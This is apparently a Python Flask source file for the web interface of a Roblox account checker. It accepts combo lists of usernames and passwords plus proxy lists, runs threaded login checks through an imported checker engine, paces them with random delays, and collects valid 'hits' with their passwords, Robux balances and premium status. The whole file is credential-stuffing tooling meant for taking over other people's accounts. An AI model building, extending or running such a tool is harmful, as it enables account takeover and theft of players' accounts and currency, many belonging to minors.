# app.py - Web Interface for Roblox Account Checker

import os
import sys
import json
import time
import threading
import queue
import random
from datetime import datetime
from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO, emit

# Import the original checker
from wf import AntraxRblxChecker, Account

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Global state
checker_state = {
    'running': False,
    'paused': False,
    'accounts': [],
    'results': [],
    'stats': {
        'total': 0,
        'verified': 0,
        'valid': 0,
        'wrong_password': 0,
        'captcha': 0,
        'rate_limit': 0,
        'timeout': 0,
        'blocked': 0,
        'driver_error': 0,
        'other_errors': 0,
        'premium_accounts': 0,
        'total_robux': 0,
        'start_time': None,
        'speed': 0,
        'hit_rate': 0
    },
    'logs': [],
    'recent_results': [],
    'current_account': None,
    'total_accounts': 0,
    'hits': []
}

checker = None
work_queue = queue.Queue()
running = False
paused = False

def add_log(message, level='info'):
    """Add a log entry"""
    log_entry = {
        'time': datetime.now().strftime('%H:%M:%S'),
        'message': message,
        'level': level
    }
    checker_state['logs'].append(log_entry)
    if len(checker_state['logs']) > 500:
        checker_state['logs'].pop(0)
    socketio.emit('log', log_entry)

def emit_socket_event(event, data):
    try:
        socketio.emit(event, data)
    except Exception:
        pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/status')
def get_status():
    return jsonify({
        'running': checker_state['running'],
        'paused': checker_state['paused'],
        'stats': checker_state['stats'],
        'recent_results': checker_state['recent_results'][-20:],
        'total_accounts': checker_state['total_accounts'],
        'current_account': checker_state['current_account'],
        'hits': checker_state['hits'][-50:]
    })

@app.route('/api/start', methods=['POST'])
def start_checker():
    global checker, running, paused, work_queue
    
    if checker_state['running']:
        return jsonify({'error': 'Checker already running'}), 400
    
    data = request.json
    combo_text = data.get('combo', '')
    proxy_text = data.get('proxies', '')
    threads = int(data.get('threads', 2))
    min_delay = float(data.get('min_delay', 10))
    max_delay = float(data.get('max_delay', 20))
    
    if not combo_text:
        return jsonify({'error': 'No accounts provided'}), 400
    
    # Parse accounts
    accounts = []
    for line in combo_text.strip().split('\n'):
        line = line.strip()
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2:
                accounts.append(Account(
                    username=parts[0].strip(),
                    password=parts[1].strip()
                ))
    
    if not accounts:
        return jsonify({'error': 'No valid accounts found (format: user:pass)'}), 400
    
    # Parse proxies
    proxies = []
    if proxy_text:
        for line in proxy_text.strip().split('\n'):
            line = line.strip()
            if line and not line.startswith('#'):
                proxies.append(line)
    
    # Create checker instance with the original AntraxRblxChecker
    checker = AntraxRblxChecker()
    checker.accounts = accounts
    checker.min_delay = min_delay
    checker.max_delay = max_delay
    checker.max_workers = threads
    checker.max_accounts_per_test = len(accounts)
    
    # Add proxies if provided
    if proxies:
        checker.proxy_manager.proxies = proxies
        checker.proxy_manager.active_proxies = proxies.copy()
    
    # Reset state
    checker_state['running'] = True
    checker_state['paused'] = False
    checker_state['accounts'] = accounts
    checker_state['results'] = []
    checker_state['logs'] = []
    checker_state['recent_results'] = []
    checker_state['hits'] = []
    checker_state['stats'] = {
        'total': len(accounts),
        'verified': 0,
        'valid': 0,
        'wrong_password': 0,
        'captcha': 0,
        'rate_limit': 0,
        'timeout': 0,
        'blocked': 0,
        'driver_error': 0,
        'other_errors': 0,
        'premium_accounts': 0,
        'total_robux': 0,
        'start_time': time.time(),
        'speed': 0,
        'hit_rate': 0
    }
    checker_state['total_accounts'] = len(accounts)
    
    # Start worker threads
    work_queue = queue.Queue()
    for account in accounts:
        work_queue.put(account)
    
    for i in range(threads):
        w = threading.Thread(
            target=checker_worker,
            args=(i+1, work_queue),
            daemon=True
        )
        w.start()
    
    # Start monitoring thread
    monitor_thread = threading.Thread(target=monitor_progress, args=(len(accounts),), daemon=True)
    monitor_thread.start()
    
    add_log(f'🚀 Checker started with {len(accounts)} accounts and {len(proxies)} proxies', 'success')
    
    return jsonify({
        'success': True,
        'message': f'Checker started with {len(accounts)} accounts',
        'total': len(accounts)
    })

def checker_worker(worker_id, work_queue):
    """Worker thread using the original checker"""
    while checker_state['running'] and not work_queue.empty():
        try:
            # Check if paused
            while checker_state['paused'] and checker_state['running']:
                time.sleep(0.5)
            
            if not checker_state['running']:
                break
            
            account = work_queue.get_nowait()
            checker_state['current_account'] = account.username
            
            # Use the original verify_account method
            verified_account = checker.verify_account(account, worker_id)
            
            # Update stats
            stats = checker_state['stats']
            stats['verified'] += 1
            
            # Map status to stats
            status_map = {
                'valid': 'valid',
                'invalid_password': 'wrong_password',
                'captcha': 'captcha',
                'rate_limit': 'rate_limit',
                'timeout': 'timeout',
                'blocked': 'blocked',
                'driver_error': 'driver_error',
                'error': 'other_errors'
            }
            if verified_account.status in status_map:
                stats[status_map[verified_account.status]] += 1
            
            # Check if valid
            if verified_account.status == 'valid':
                stats['valid'] += 1
                if verified_account.premium:
                    stats['premium_accounts'] += 1
                if verified_account.robux > 0:
                    stats['total_robux'] += verified_account.robux
                
                # Store hit
                hit_data = {
                    'username': verified_account.username,
                    'password': verified_account.password,
                    'robux': verified_account.robux,
                    'premium': verified_account.premium,
                    'user_id': verified_account.user_id,
                    'display_name': verified_account.display_name,
                    'friends': verified_account.friends,
                    'followers': verified_account.followers,
                    'account_age': verified_account.account_age,
                    'join_date': verified_account.join_date,
                    'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
                checker_state['hits'].append(hit_data)
                # Emit hit event for immediate display
                emit_socket_event('hit', hit_data)
            
            # Add to recent results
            result_line = {
                'worker': worker_id,
                'status': verified_account.status,
                'username': verified_account.username,
                'message': verified_account.message,
                'robux': verified_account.robux,
                'premium': verified_account.premium
            }
            checker_state['recent_results'].append(result_line)
            if len(checker_state['recent_results']) > 50:
                checker_state['recent_results'].pop(0)
            
            # Emit update
            emit_socket_event('update', result_line)
            
            # Add log
            if verified_account.status == 'valid':
                premium_tag = ' [PREMIUM]' if verified_account.premium else ''
                robux_tag = f' | R${verified_account.robux:,}' if verified_account.robux > 0 else ''
                add_log(f'✅ Worker {worker_id}: {verified_account.username} - HIT{premium_tag}{robux_tag}', 'success')
            else:
                status_emoji = '❌'
                if verified_account.status == 'captcha':
                    status_emoji = '🤖'
                elif verified_account.status == 'rate_limit':
                    status_emoji = '⏳'
                elif verified_account.status == 'timeout':
                    status_emoji = '⏰'
                add_log(f'{status_emoji} Worker {worker_id}: {verified_account.username} - {verified_account.message}', 'info')
            
            # Delay between checks
            if checker_state['running']:
                delay = random.uniform(checker.min_delay, checker.max_delay)
                time.sleep(delay)
            
            work_queue.task_done()
            
        except queue.Empty:
            break
        except Exception as e:
            add_log(f'Error in worker {worker_id}: {str(e)}', 'error')
            work_queue.task_done()

def monitor_progress(total):
    """Monitor and emit progress updates"""
    while checker_state['running']:
        try:
            stats = checker_state['stats']
            elapsed = time.time() - stats['start_time'] if stats['start_time'] else 0
            minutes = elapsed / 60 if elapsed > 0 else 1
            
            speed = stats['verified'] / minutes if minutes > 0 else 0
            hit_rate = (stats['valid'] / stats['verified'] * 100) if stats['verified'] > 0 else 0
            
            stats['speed'] = speed
            stats['hit_rate'] = hit_rate
            
            progress_data = {
                'verified': stats['verified'],
                'total': total,
                'valid': stats['valid'],
                'premium': stats['premium_accounts'],
                'robux': stats['total_robux'],
                'speed': round(speed, 1),
                'hit_rate': round(hit_rate, 1),
                'elapsed': round(elapsed, 0)
            }
            
            emit_socket_event('progress', progress_data)
            
            if stats['verified'] >= total and total > 0:
                checker_state['running'] = False
                add_log('✅ All accounts verified!', 'success')
                emit_socket_event('complete', {'message': 'All accounts verified!'})
                break
            
            time.sleep(1)
            
        except Exception as e:
            add_log(f'Monitor error: {str(e)}', 'error')
            time.sleep(1)

@app.route('/api/stop', methods=['POST'])
def stop_checker():
    checker_state['running'] = False
    if checker:
        checker.running = False
    add_log('⏹ Checker stopped by user', 'warning')
    return jsonify({'success': True})

@app.route('/api/pause', methods=['POST'])
def pause_checker():
    checker_state['paused'] = True
    if checker:
        checker.paused = True
    add_log('⏸ Checker paused', 'warning')
    return jsonify({'success': True})

@app.route('/api/resume', methods=['POST'])
def resume_checker():
    checker_state['paused'] = False
    if checker:
        checker.paused = False
    add_log('▶ Checker resumed', 'info')
    return jsonify({'success': True})

@socketio.on('connect')
def handle_connect():
    emit('connected', {'status': 'connected'})
    add_log('📡 Client connected', 'info')

@socketio.on('disconnect')
def handle_disconnect():
    add_log('📡 Client disconnected', 'info')

if __name__ == '__main__':
    # Make sure we can import the checker
    try:
        from wf import AntraxRblxChecker, Account
        print("[+] ✅ Successfully loaded AntraxRblxChecker from wf.py")
    except ImportError as e:
        print(f"[-] ❌ Error importing from wf.py: {e}")
        print("[!] Make sure wf.py is in the same directory")
        sys.exit(1)
    
    print("[+] 🚀 Starting Roblox Account Checker Web Interface")
    print("[+] 🌐 Open http://localhost:5000 in your browser")
    print("[+] 📊 Using original AntraxRblxChecker engine")
    socketio.run(app, debug=False, host='0.0.0.0', port=5000)
